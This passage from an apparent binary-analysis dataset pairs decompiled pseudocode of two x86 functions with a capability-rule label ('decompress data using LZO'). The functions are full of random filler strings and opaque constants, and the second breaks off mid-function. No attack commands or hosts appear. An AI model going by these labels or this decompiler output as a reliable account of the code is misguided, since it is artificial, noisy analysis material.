        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.0043ce50(int32_t param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack408 [14];\n    uchar auStack352 [20];\n    uint uStack332;\n    uint *var_124h;\n    uchar *var_120h;\n    uint *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    int32_t *var_100h;\n    int32_t *var_fch;\n    uchar *var_f8h;\n    int32_t *var_f4h;\n    uchar *var_f0h;\n    uchar *var_ech;\n    uint *var_e8h;\n    uchar *var_e4h;\n    uint *var_e0h;\n    uchar *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    int32_t *var_b0h;\n    uchar *var_ach;\n    int32_t *var_a8h;\n    uchar *var_a4h;\n    uint *var_a0h;\n    uchar *var_9ch;\n    uint *var_98h;\n    uchar *var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uchar *var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    uchar *puVar7;\n    \n    var_1ch = &fcn.0043ce50::var_124h;\n    var_10h = 0xffffffff;\n    var_14h = 0x450c60;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0043ce50::var_18h;\n    var_90h = param_1 + 8;\n    var_88h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_8ch = var_88h + 0x24;\n    fcn.004040a7();\n    var_10h = 1;\n    var_84h = &stack0xfffffeb8;\n    var_9ch = &stack0xfffffeb8;\n    uStack332 = 0x43cf03;\n    fcn.004020e0(&fcn.0043ce50::var_38h, 0, 0, 0, 0x40c6c780, 0x3b1, 0);\n    uStack332 = 0x43cf10;\n    fcn.00403b02();\n    var_98h = &stack0xfffffe68;\n    var_94h = &stack0xfffffea0;\n    fcn.00401e79(\"iyivzmqmnrmouzeimggnkdgigubgfboatrjhuhmqbkwfdrtuogkpwihayecudoysurmtikgpdthlymjuqmwz\");\n    var_a0h = var_98h + 8;\n    var_10h = 0xf;\n    fcn.00401e79(\"vvckrkbttsyfemttcaoopookonhmmknnzehyslrugbdyyhfldhcele\");\n    var_10h = 0x10;\n    arg_8h = \"wdwpzvcgpmuorgwziiztumzopgefbonlgvklcgihfcyzsosrkyqykizwsvevg\";\n    fcn.00401e79(\"wdwpzvcgpmuorgwziiztumzopgefbonlgvklcgihfcyzsosrkyqykizwsvevg\");\n    puVar1 = var_98h;\n    *var_98h = 0x14fb;\n    *(puVar1 + 7) = 0;\n    fcn.004035ad(arg_8h);\n    puVar2 = var_9ch;\n    var_ach = var_9ch;\n    *(var_9ch + -4) = var_9ch;\n    var_a8h = puVar2 + -0x50;\n    var_a4h = puVar2 + -0x18;\n    var_10h = 1;\n    *(puVar2 + -0x54) = \"pladnxrwyhaqiloardkgqjypdp\";\n    *(puVar2 + -0x58) = 0x43cfee;\n    fcn.00401e79(*(puVar2 + -0x54));\n    var_b0h = var_a8h + 8;\n    var_10h = 0xd;\n    *(puVar2 + -0x58) = \"ywblsgauhqeqzdngnxgarhogacdcuoptjysjhlmed\";\n    *(puVar2 + -0x5c) = 0x43d019;\n    fcn.00401e79(*(puVar2 + -0x58));\n    var_10h = 0xe;\n    *(puVar2 + -0x5c) = \"zdzkebnynpvii\";\n    *(puVar2 + -0x60) = 0x43d03e;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    piVar4 = var_a8h;\n    *var_a8h = &fcn.0043ce50::var_50h;\n    piVar4[1] = 0xd5a;\n    var_10h = 1;\n    *(puVar2 + -0x60) = 0x43d067;\n    fcn.00403517(*(puVar2 + -0x5c));\n    puVar3 = var_ach;\n    *(var_ach + -4) = 0x43d07c;\n    fcn.00403b02();\n    var_b8h = puVar3 + -0x18;\n    *(puVar3 + -0xc) = 0x40ba0a00;\n    *(puVar3 + -0x10) = 0;\n    *(puVar3 + -0x14) = 0x40b8af00;\n    *(puVar3 + -0x18) = 0;\n    *(puVar3 + -4) = 0x1278;\n    *(puVar3 + -8) = 0x141;\n    *(puVar3 + -0x1c) = 0x43d0b5;\n    fcn.00403c24(*(puVar3 + -0x18), *(puVar3 + -0x14), *(puVar3 + -0x10), *(puVar3 + -0xc), *(puVar3 + -8), \n                 *(puVar3 + -4));\n    var_b4h = puVar3 + -0x44;\n    *(puVar3 + -0x48) =\n         \"jmezwibxgrxyatfdlijtpieuhsopfjzfospcsqwguizzwbcgxebqijwcksfjhuozefyylzbqrmkejbeualcgchfjqphutjewpe\";\n    *(puVar3 + -0x4c) = 0x43d0dd;\n    fcn.00401e79(*(puVar3 + -0x48));\n    puVar2 = var_b4h;\n    *var_b4h = 1;\n    *(puVar2 + 4) = 0x1156;\n    *(puVar2 + 8) = 0xc36;\n    *(puVar2 + 0xc) = 0x13ef;\n    puVar2[0x10] = 0;\n    *(puVar3 + -0x4c) = 0x43d10f;\n    fcn.00403274(*(puVar3 + -0x48));\n    puVar3 = var_b8h;\n    var_c4h = var_b8h;\n    *(var_b8h + -4) = var_b8h;\n    var_c0h = puVar3 + -0x8c;\n    var_bch = puVar3 + -0x18;\n    *(puVar3 + -0x90) = \"iufvxljurgfcdmraetbgzffqsjmdgistbhbpfuoombzfvbpvuxstfairbjyfxs\";\n    *(puVar3 + -0x94) = 0x43d149;\n    fcn.00401e79(*(puVar3 + -0x90));\n    var_c8h = var_c0h + 0x5c;\n    var_10h = 9;\n    *(puVar3 + -0x94) = \"bjhhcsvnacsgovrvmfjhwpwfkfwwakanjqjvwqrbvbkubuzyazztbowzekfrkwlzsyfdgjhj\";\n    *(puVar3 + -0x98) = 0x43d174;\n    fcn.00401e79(*(puVar3 + -0x94));\n    var_cch = var_c0h + 0x44;\n    var_10h = 10;\n    *(puVar3 + -0x98) = \"nixvmahhhtrahfavdklmjjvsfdzmwrjwlputrtbreceuplzyjjygm\";\n    *(puVar3 + -0x9c) = 0x43d19f;\n    fcn.00401e79(*(puVar3 + -0x98));\n    var_d0h = var_c0h + 0x28;\n    var_10h = 0xb;\n    *(puVar3 + -0x9c) =\n         \"cofibkjtgubypofmipmvstgptehskjpocatubmhweldpgurdzzzuyuvcjsncsbobnktbcnqgwiubdcznfshpgwxfgszabxa\";\n    *(puVar3 + -0xa0) = 0x43d1ca;\n    fcn.00401e79(*(puVar3 + -0x9c));\n    var_10h = 0xc;\n    *(puVar3 + -0xa0) = \"zdabwcmlndbhqrksdzdnfxetpdtbd\";\n    *(puVar3 + -0xa4) = 0x43d1ec;\n    fcn.00401e79(*(puVar3 + -0xa0));\n    puVar2 = var_c0h;\n    *(var_c0h + 0x1c) = 0x40bb4500;\n    *(puVar2 + 0x18) = 0;\n    *(puVar2 + 0x24) = 0x40805800;\n    *(puVar2 + 0x20) = 0;\n    *(puVar2 + 0x40) = 0x745;\n    *(puVar3 + -0xa4) = 0x43d225;\n    fcn.00401c67(*(puVar3 + -0xa0));\n    puVar3 = var_c4h;\n    var_10h = 1;\n    *(var_c4h + -4) = 0x43d241;\n    fcn.004064ce();\n    var_dch = puVar3 + -0x18;\n    *(puVar3 + -0x18) = &fcn.0043ce50::var_68h;\n    *(puVar3 + -0xc) = 0x40c5a380;\n    *(puVar3 + -0x10) = 0;\n    *(puVar3 + -4) = 0;\n    *(puVar3 + -8) = 0x21fb;\n    *(puVar3 + -0x14) = 0xacb;\n    *(puVar3 + -0x1c) = 0x43d27e;\n    fcn.00404a02(*(puVar3 + -0x18), *(puVar3 + -0x14), *(puVar3 + -0x10), *(puVar3 + -0xc), *(puVar3 + -8), \n                 *(puVar3 + -4));\n    *(puVar3 + -0x1c) = 0x43d28b;\n    fcn.00403b02();\n    var_d8h = puVar3 + -0x54;\n    var_d4h = puVar3 + -0x3c;\n    *(puVar3 + -0x58) = \"sposxalfsxxpcgbelzpvpukmkyrjglbpvoizhmklpcxdrrofeovdepzpjxrnumoajv\";\n    *(puVar3 + -0x5c) = 0x43d2b9;\n    fcn.00401e79(*(puVar3 + -0x58));\n    var_10h = 8;\n    *(puVar3 + -0x5c) = \"gvcthsmfifoykavwjklqrlrujtxxrziiohxebhp\";\n    *(puVar3 + -0x60) = 0x43d2db;\n    fcn.00401e79(*(puVar3 + -0x5c));\n    puVar2 = var_d8h;\n    *(var_d8h + 0x34) = 0x40b4c600;\n    *(puVar2 + 0x30) = 0;\n    puVar2[0x38] = 1;\n    *(puVar3 + -0x60) = 0x43d303;\n    fcn.00401785(*(puVar3 + -0x5c));\n    puVar2 = var_dch;\n    var_10h = 1;\n    puVar5 = var_dch + -0x18;\n    puVar6 = var_dch + -0x18;\n    var_e4h = var_dch + -0x18;\n    puVar7 = var_dch + -0x18;\n    *(var_dch + -0x10) = 0x40e5bae0;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -4) = 0x1384;\n    *(puVar2 + -8) = 0x51d;\n    *(puVar2 + -0xc) = 0x14a;\n    *puVar5 = 0x4a;\n    *(puVar2 + -0x1c) = 0x43d34b;\n    fcn.004038eb(*puVar6, *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x1c) = puVar7;\n    var_e0h = puVar2 + -0x38;\n    *(puVar2 + -0x3c) = \"wkgtmocywfsfjqbdgxypmtgydpnjutftwccjptldtezosstatinpzthaxgolutqvaohmkr\";\n    *(puVar2 + -0x40) = 0x43d379;\n    fcn.00401e79(*(puVar2 + -0x3c));\n    puVar1 = var_e0h;\n    var_e0h[1] = 0x40b4ee00;\n    *puVar1 = 0;\n    *(puVar2 + -0x40) = 0x43d39c;\n    fcn.0040360c(*(puVar2 + -0x3c));\n    puVar2 = var_e4h;\n    var_ech = var_e4h;\n    *(var_e4h + -4) = var_e4h;\n    var_e8h = puVar2 + -0x1c;\n    *(puVar2 + -0x20) = \"bqpnmgilaiuv\";\n    *(puVar2 + -0x24) = 0x43d3d2;\n    fcn.00401e79(*(puVar2 + -0x20));\n    *var_e8h = 0xb5b;\n    *(puVar2 + -0x24) = 0x43d3ee;\n    fcn.00403c33(*(puVar2 + -0x20));\n    puVar2 = var_ech;\n    var_f8h = var_ech;\n    *(var_ech + -4) = var_ech;\n    var_f4h = puVar2 + -0x7c;\n    var_f0h = puVar2 + -0x18;\n    *(puVar2 + -0x80) = \"ygyjvxjzxz\";\n    *(puVar2 + -0x84) = 0x43d42a;\n    fcn.00401e79(*(puVar2 + -0x80));\n    var_fch = var_f4h + 0x13;\n    var_10h = 5;\n    *(puVar2 + -0x84) = \"dlpmeukeissnjjiioaitfqnxiixcmyeiawdusvly\";\n    *(puVar2 + -0x88) = 0x43d455;\n    fcn.00401e79(*(puVar2 + -0x84));\n    var_100h = var_f4h + 0xb;\n    var_10h = 6;\n    *(puVar2 + -0x88) = \"soqwsrk\";\n    *(puVar2 + -0x8c) = 0x43d480;\n    fcn.00401e79(*(puVar2 + -0x88));\n    var_10h = 7;\n    *(puVar2 + -0x8c) = \"hdppmc\";\n    *(puVar2 + -0x90) = 0x43d4a5;\n    fcn.00401e79(*(puVar2 + -0x8c));\n    piVar4 = var_f4h;\n    *var_f4h = &fcn.0043ce50::var_80h;\n    *(piVar4 + 1) = 0;\n    piVar4[3] = 0x40b0fe00;\n    piVar4[2] = 0;\n    *(piVar4 + 10) = 0;\n    piVar4[0x12] = 0x40de2000;\n    piVar4[0x11] = 0;\n    var_10h = 1;\n    *(puVar2 + -0x90) = 0x43d4eb;\n    fcn.00401b31(*(puVar2 + -0x8c));\n    puVar3 = var_f8h;\n    *(var_f8h + -4) = 0x43d500;\n    fcn.00403b02();\n    var_10ch = puVar3;\n    var_108h = puVar3 + -0x50;\n    var_104h = puVar3 + -0x34;\n    *(puVar3 + -0x54) = 0x54d65d;\n    *(puVar3 + -0x58) = 0x43d52e;\n    fcn.00401e79(*(puVar3 + -0x54));\n    var_10h = 4;\n    *(puVar3 + -0x58) = \"chzdswjditfuvjkrkobxpbjglfirxrppzbluikjsglamatprfkftbchxdmmabhgmusgfgbw\";\n    *(puVar3 + -0x5c) = 0x43d550;\n    fcn.00401e79(*(puVar3 + -0x58));\n    puVar2 = var_108h;\n    var_108h[0x18] = 0;\n    puVar2[0x34] = 1;\n    *(puVar2 + 0x3c) = 0x40d0f140;\n    *(puVar2 + 0x38) = 0;\n    puVar2[0x40] = 0;\n    *(puVar2 + 0x48) = 0x40d1b540;\n    *(puVar2 + 0x44) = 0;\n    puVar2[0x4c] = 0;\n    var_10h = 1;\n    *(puVar3 + -0x5c) = 0x43d599;\n    fcn.00404e9e(*(puVar3 + -0x58));\n    puVar3 = var_10ch;\n    var_114h = var_10ch;\n    *(var_10ch + -4) = var_10ch;\n    var_110h = puVar3 + -0x34;\n    *(puVar3 + -0x38) =\n         \"anudwfiujuzrsdnvxwbatpndzzyhxjdmqowwsojkuxsvhzfdcspzmswchnthtupimtaidspmwlloblopwpsbvuybkfvzcdvsga\";\n    *(puVar3 + -0x3c) = 0x43d5cc;\n    fcn.00401e79(*(puVar3 + -0x38));\n    puVar2 = var_110h;\n    *(var_110h + 0x18) = 0x5f0;\n    *(puVar2 + 0x1c) = 0x1a48;\n    puVar2[0x20] = 1;\n    *(puVar2 + 0x28) = 0x40b9a200;\n    *(puVar2 + 0x24) = 0;\n    *(puVar2 + 0x30) = 0x40b3de00;\n    *(puVar2 + 0x2c) = 0;\n    *(puVar3 + -0x3c) = 0x43d610;\n    fcn.00401645(*(puVar3 + -0x38));\n    puVar2 = var_114h;\n    *(var_114h + -4) = 0x43d628;\n    fcn.00405f47();\n    var_120h = puVar2;\n    var_11ch = puVar2 + -0x54;\n    var_118h = puVar2 + -0x18;\n    *(puVar2 + -0x58) =\n         \"ypalbfegmqiqrzylwwpelqmcxkxeitnygboxlephdsbmzagrkdbjsjwsgysyvifdeytbmpkrirjwpygctpshazuofwsprzdjvd\";\n    *(puVar2 + -0x5c) = 0x43d65d;\n    fcn.00401e79(*(puVar2 + -0x58));\n    var_124h = var_11ch + 9;\n    var_10h = 2;\n    *(puVar2 + -0x5c) = \"znqpfmyoyutzdeahikvhx\";\n    *(puVar2 + -0x60) = 0x43d688;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    var_10h = 3;\n    *(puVar2 + -0x60) = \"tawyeymzswojakxjauxoxlbxkaphioynhxfuyzsfxqznobvfoooyopjrjtpln\";\n    *(puVar2 + -100) = 0x43d6ad;\n    fcn.00401e79(*(puVar2 + -0x60));\n    puVar1 = var_11ch;\n    *var_11ch = 0x1dc;\n    *(puVar1 + 1) = 1;\n    *(puVar1 + 2) = 0;\n    var_10h = 1;\n    *(puVar2 + -100) = 0x43d6d8;\n    fcn.00404110(*(puVar2 + -0x60));\n    *in_FS_OFFSET = var_18h;\n    return var_88h;\n}\n",
        "token_count": 5638
    },
    "004402c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.004402c0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t aiStack468 [8];\n    uchar auStack436 [64];\n    uint uStack372;\n    uchar *var_16ch;\n    uchar *var_168h;\n    uchar *var_164h;\n    uchar *var_160h;\n    uint *var_15ch;\n    uchar *var_158h;\n    uchar *var_154h;\n    uchar *var_150h;\n    uchar *var_14ch;\n    uchar *var_148h;\n    uint *var_144h;\n    uchar *var_140h;\n    uchar *var_13ch;\n    uchar *var_138h;\n    uchar *var_134h;\n    uchar *var_130h;\n    int32_t *var_12ch;\n    uchar *var_128h;\n    uchar *var_124h;\n    uchar *var_120h;\n    uchar *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    int32_t *var_108h;\n    uchar *var_104h;\n    uchar *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uchar *var_f4h;\n    int32_t *var_f0h;\n    uchar *var_ech;\n    uchar *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    uchar *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    uint *var_bch;\n    int32_t *var_b8h;\n    uchar *var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar8;\n    \n    var_1ch = &fcn.004402c0::var_16ch;\n    var_bch = &fcn.004402c0::var_16ch;\n    var_10h = 0xffffffff;\n    var_14h = 0x450ea0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004402c0::var_18h;\n    var_cch = param_1 + 8;\n    uStack372 = 0x44030c;\n    var_c4h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_c8h = var_c4h + 0x30;\n    uStack372 = 0x440320;\n    fcn.004040a7();\n    var_c0h = var_c4h + 0x50;\n    uStack372 = 0x440334;\n    fcn.004040a7();\n    var_b8h = &stack0xfffffe2c;\n    var_b4h = &stack0xfffffe4c;\n    var_10h = 2;\n    fcn.00401e79(\"jobgbwjvpibxadguivkpoiwdkgcvhlouwcpykitbrhouelxoiaqkkhwdkrjdsfwvxc\");\n    var_10h = 0xf;\n    arg_8h = 0x54dfc1;\n    fcn.00401e79(0x54dfc1);\n    piVar4 = var_b8h;\n    *var_b8h = &fcn.004402c0::var_38h;\n    piVar4[7] = 0xdd2;\n    piVar4[0xe] = 0x193a;\n    piVar4[0xf] = 0x7ad;\n    piVar4[0x11] = 0x40e41120;\n    piVar4[0x10] = 0;\n    piVar4[0x13] = 0x40df1180;\n    piVar4[0x12] = 0;\n    piVar4[0x15] = 0x40c43200;\n    piVar4[0x14] = 0;\n    piVar4[0x16] = 0x8ba;\n    piVar4[0x18] = 0x40c11180;\n    piVar4[0x17] = 0;\n    var_10h = 2;\n    fcn.00402987(arg_8h);\n    puVar2 = var_bch;\n    *(var_bch + -4) = 0x440419;\n    fcn.00403b02();\n    var_d4h = puVar2;\n    var_d0h = puVar2 + -0x38;\n    *(puVar2 + -0x3c) = \"benywhlvofwmbvhnkmhvroubnnlfxtjsegzgkbyfebsfidzokiapqjganaynansqvbhpjcfkpzyu\";\n    *(puVar2 + -0x40) = 0x44043e;\n    fcn.00401e79(*(puVar2 + -0x3c));\n    puVar1 = var_d0h;\n    *(var_d0h + 0x1c) = 0x40b61800;\n    *(puVar1 + 0x18) = 0;\n    puVar1[0x20] = 1;\n    *(puVar1 + 0x28) = 0x40e61ce0;\n    *(puVar1 + 0x24) = 0;\n    puVar1[0x2c] = 1;\n    *(puVar1 + 0x34) = 0x40bb3800;\n    *(puVar1 + 0x30) = 0;\n    *(puVar2 + -0x40) = 0x440486;\n    fcn.00401537(*(puVar2 + -0x3c));\n    puVar1 = var_d4h;\n    puVar5 = var_d4h + -0xc;\n    var_e0h = var_d4h + -0xc;\n    *(var_d4h + -0xc) = &fcn.004402c0::var_50h;\n    *(puVar1 + -4) = 0x40d6b780;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x10) = 0x4404b1;\n    fcn.00406843(*puVar5, *(puVar1 + -8));\n    *(puVar1 + -0x10) = 0x4404be;\n    fcn.00403b02();\n    var_dch = puVar1 + -0x70;\n    var_d8h = puVar1 + -0x24;\n    *(puVar1 + -0x74) = \"eblxkbmxseqgcelouvtksrrixoumiojwjbifclzzxjeqjhwwujqaoi\";\n    *(puVar1 + -0x78) = 0x4404ec;\n    fcn.00401e79(*(puVar1 + -0x74));\n    var_e4h = var_dch + 0x34;\n    var_10h = 0xc;\n    *(puVar1 + -0x78) = \"jdjrgowfudhuuvwdzavhjblvtckomarqpjxevqkytuuujqfatnjjcbybezoqmluqwsvooszi\";\n    *(puVar1 + -0x7c) = 0x440517;\n    fcn.00401e79(*(puVar1 + -0x78));\n    var_e8h = var_dch + 0x1c;\n    var_10h = 0xd;\n    *(puVar1 + -0x7c) = \"eiifzedvzriiwndsqseusvqpkgnuxhnejrtwnkovumxhjsfdfidhmghznabmzdfbuvunonkpjg\";\n    *(puVar1 + -0x80) = 0x440542;\n    fcn.00401e79(*(puVar1 + -0x7c));\n    var_10h = 0xe;\n    *(puVar1 + -0x80) = \"ucnjmbofhnfknsqjmkgmnihmw\";\n    *(puVar1 + -0x84) = 0x440564;\n    fcn.00401e79(*(puVar1 + -0x80));\n    *(var_dch + 0x18) = 0x13be;\n    var_10h = 2;\n    *(puVar1 + -0x84) = 0x440588;\n    fcn.00403625(*(puVar1 + -0x80));\n    puVar1 = var_e0h;\n    *(var_e0h + -4) = 0x4405a0;\n    fcn.004028e2();\n    var_ech = puVar1 + -0x18;\n    *(puVar1 + -4) = 0x40dd2880;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x14) = 0x40e888c0;\n    *(puVar1 + -0x18) = 0;\n    *(puVar1 + -0xc) = 0x494;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -0x1c) = 0x4405d9;\n    fcn.00404944(*(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8));\n    *(puVar1 + -0x1c) = puVar1 + -0x18;\n    *(puVar1 + -0x34) = \"oxhcrsjhozbfhylblyflddxxaryxead\";\n    *(puVar1 + -0x38) = 0x4405fc;\n    fcn.00401e79(*(puVar1 + -0x34));\n    *(puVar1 + -0x38) = 0x44060c;\n    fcn.00402fdb(*(puVar1 + -0x34));\n    puVar1 = var_ech;\n    puVar6 = var_ech + -4;\n    *(var_ech + -4) = 0;\n    *(puVar1 + -8) = 0x44062f;\n    fcn.00405515(*puVar6);\n    var_f4h = puVar1 + -0x10;\n    *(puVar1 + -0x10) = &fcn.004402c0::var_68h;\n    *(puVar1 + -8) = 1;\n    *(puVar1 + -0xc) = 0x14b0;\n    *(puVar1 + -0x14) = 0x440659;\n    fcn.004026c6(*(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8));\n    *(puVar1 + -0x14) = 0x440666;\n    fcn.00403b02();\n    var_f0h = puVar1 + -0x44;\n    *(puVar1 + -0x48) = \"nfdypanybmlhlmecgwudodmwfdtfirmutwclvuplczdgapiwherzdcpeowqa\";\n    *(puVar1 + -0x4c) = 0x44068e;\n    fcn.00401e79(*(puVar1 + -0x48));\n    piVar4 = var_f0h;\n    *var_f0h = &fcn.004402c0::var_80h;\n    piVar4[7] = 0xba9;\n    piVar4[9] = 0x40ccce80;\n    piVar4[8] = 0;\n    *(piVar4 + 10) = 0;\n    piVar4[0xc] = 0x40c20400;\n    piVar4[0xb] = 0;\n    *(puVar1 + -0x4c) = 0x4406d0;\n    fcn.004047fa(*(puVar1 + -0x48));\n    puVar2 = var_f4h;\n    *(var_f4h + -4) = 0x4406e5;\n    fcn.00403b02();\n    var_100h = puVar2;\n    var_fch = puVar2 + -0x5c;\n    var_f8h = puVar2 + -0x30;\n    *(puVar2 + -0x60) = \"vnwlvhftiqvhmiggnvuoxaf\";\n    *(puVar2 + -100) = 0x440713;\n    fcn.00401e79(*(puVar2 + -0x60));\n    var_10h = 0xb;\n    *(puVar2 + -100) =\n         \"vihvpycglvqdfklqocppqpuefkzylzvwqzsleibjmqfauofzxeasfbfrtgrzfglzsgsymjhtbbwsmmucephqjzdgrriakqnjc\";\n    *(puVar2 + -0x68) = 0x440738;\n    fcn.00401e79(*(puVar2 + -100));\n    puVar1 = var_fch;\n    *var_fch = 0;\n    *(puVar1 + 8) = 0x40dccb80;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0x10) = 0x40b93f00;\n    *(puVar1 + 0xc) = 0;\n    *(puVar1 + 0x48) = 0x40c63a80;\n    *(puVar1 + 0x44) = 0;\n    *(puVar1 + 0x50) = 0x40996400;\n    *(puVar1 + 0x4c) = 0;\n    *(puVar1 + 0x58) = 0x40d3b700;\n    *(puVar1 + 0x54) = 0;\n    var_10h = 2;\n    *(puVar2 + -0x68) = 0x44079e;\n    fcn.00403be8(*(puVar2 + -100));\n    puVar1 = var_100h;\n    var_110h = var_100h + -0x34;\n    puVar7 = var_100h + -0x34;\n    puVar8 = var_100h + -0x34;\n    var_10ch = var_100h + -0x34;\n    *(var_100h + -4) = 0x40d656c0;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x10) = 0x40e6e400;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -0x18) = 0x40acfa00;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x2c) = 0x40e00240;\n    *(puVar1 + -0x30) = 0;\n    *(puVar1 + -0xc) = 0x4f5;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x24) = 0x424;\n    *(puVar1 + -0x28) = 0xad3;\n    *puVar7 = 0x6f6;\n    *(puVar1 + -0x38) = 0x44081b;\n    fcn.004038c3(*puVar8, *(puVar1 + -0x30), *(puVar1 + -0x2c), *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20)\n                 , *(puVar1 + -0x1c), *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), \n                 *(puVar1 + -8));\n    var_108h = puVar1 + -0x8c;\n    var_104h = puVar1 + -0x50;\n    *(puVar1 + -0x90) =\n         \"jsdrkkjqtrzvkfbsnyayzzeqmsrdrrulfvytapwnayrrwamjixhqtazskemetbdojtbpcverjwudwtsrbveqrpawzdewztdelwl\";\n    *(puVar1 + -0x94) = 0x44084b;\n    fcn.00401e79(*(puVar1 + -0x90));\n    var_10h = 10;\n    *(puVar1 + -0x94) = \"qmazzxvabbfgdmtzflgrpuehgkcjliwtsvkrvjdhkuzatwcvgpobwnzyfmtktrkvvfcxhvpqf\";\n    *(puVar1 + -0x98) = 0x440870;\n    fcn.00401e79(*(puVar1 + -0x94));\n    piVar4 = var_108h;\n    *var_108h = &fcn.004402c0::var_98h;\n    piVar4[2] = 0x40d588c0;\n    piVar4[1] = 0;\n    piVar4[9] = 0x52d;\n    *(piVar4 + 10) = 0;\n    *(piVar4 + 0xb) = 1;\n    *(piVar4 + 0xc) = 0;\n    *(piVar4 + 0xd) = 1;\n    *(piVar4 + 0xe) = 0;\n    piVar4[0x15] = 0xdb6;\n    var_10h = 2;\n    *(puVar1 + -0x98) = 0x4408c5;\n    fcn.0040376f(*(puVar1 + -0x94));\n    puVar2 = var_10ch;\n    *(var_10ch + -4) = 0x4408dd;\n    fcn.00403b02();\n    var_118h = puVar2;\n    var_114h = puVar2 + -0x34;\n    *(puVar2 + -0x38) = \"xrtczooloxrsnahzmhqkwpkpbkderco\";\n    *(puVar2 + -0x3c) = 0x440902;\n    fcn.00401e79(*(puVar2 + -0x38));\n    puVar1 = var_114h;\n    *(var_114h + 0x1c) = 0x40ca7980;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x24) = 0x4095b400;\n    *(puVar1 + 0x20) = 0;\n    *(puVar1 + 0x28) = 0x249;\n    *(puVar1 + 0x30) = 0x40ca4780;\n    *(puVar1 + 0x2c) = 0;\n    *(puVar2 + -0x3c) = 0x440949;\n    fcn.00403d91(*(puVar2 + -0x38));\n    puVar2 = var_118h;\n    var_124h = var_118h;\n    *(var_118h + -4) = var_118h;\n    var_120h = puVar2 + -0x68;\n    var_11ch = puVar2 + -0x48;\n    *(puVar2 + -0x6c) = \"nrebczahkndnbbngbyhgyuqjtecwtsmhxedkmwbrpnikalizqawoatwwvhchpgbrxmrdph\";\n    *(puVar2 + -0x70) = 0x440985;\n    fcn.00401e79(*(puVar2 + -0x6c));\n    var_10h = 9;\n    *(puVar2 + -0x70) = \"qpvbqaeilsisokpkfawptjzywcufeodjmrvxkatfnzumutuntsfadwesueiouvdwd\";\n    *(puVar2 + -0x74) = 0x4409a7;\n    fcn.00401e79(*(puVar2 + -0x70));\n    puVar1 = var_120h;\n    *(var_120h + 0x1c) = 0x40c5ef80;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x3c) = 0x40c20d00;\n    *(puVar1 + 0x38) = 0;\n    *(puVar1 + 0x44) = 0x40c74580;\n    *(puVar1 + 0x40) = 0;\n    *(puVar1 + 0x4c) = 0x40e3c520;\n    *(puVar1 + 0x48) = 0;\n    *(puVar1 + 0x54) = 0x40ece3c0;\n    *(puVar1 + 0x50) = 0;\n    *(puVar1 + 0x5c) = 0x40d02900;\n    *(puVar1 + 0x58) = 0;\n    *(puVar1 + 100) = 0x40b0e000;\n    *(puVar1 + 0x60) = 0;\n    var_10h = 2;\n    *(puVar2 + -0x74) = 0x440a26;\n    fcn.00405c86(*(puVar2 + -0x70));\n    puVar1 = var_124h;\n    var_130h = var_124h;\n    *(var_124h + -4) = var_124h;\n    